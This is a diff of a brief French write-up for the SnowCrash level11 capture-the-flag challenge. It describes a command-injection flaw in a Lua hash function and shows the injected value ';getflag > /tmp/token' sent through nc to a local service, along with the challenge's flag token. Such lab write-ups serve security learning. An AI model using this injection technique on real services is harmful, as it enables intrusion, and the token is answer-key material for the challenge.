@@ -1,5 +1,8 @@
+Il y a une faille dans la fonction hash de la file level11.lua. On peut injecter une commande avec l'argument recu pour faire un getflag entre le echo et le sha1sum.
+
 nc 127.0.0.1 5151
-Password: ;getflag > /tmp/token
-Erf nope..
+>Password: ;getflag > /tmp/token
+>Erf nope..
+
 level11@SnowCrash:~$ cat /tmp/token
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+>Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
